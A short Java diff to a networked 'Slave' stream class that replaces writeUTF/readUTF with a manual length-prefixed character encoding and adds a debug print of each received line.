@@ -176,7 +176,9 @@ public class Slave extends CustomStream implements Runnable {
 				enc = s;
 			}
 
-			dos.writeUTF(enc); // pw.println(enc);
+			// dos.writeUTF(enc);
+			dos.writeShort(enc.length());
+			dos.writeChars(enc);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
@@ -184,9 +186,16 @@ public class Slave extends CustomStream implements Runnable {
 
 	@Override
 	public String readLine() throws Exception {
+		// String s = dis.readUTF();
+		short len = dis.readShort();
 
-		String s = dis.readUTF(); // br.readLine();
+		StringBuilder builder = new StringBuilder();
+		for (int i = 0; i < len; i++) {
+			builder.append(dis.readChar());
+		}
 
+		String s = builder.toString();
+		System.out.println(s);
 		if (s.startsWith("-h ")) {
 			s = Hex.decode(s.substring(3, s.length()));
 		} else if (s.startsWith("-c ")) {
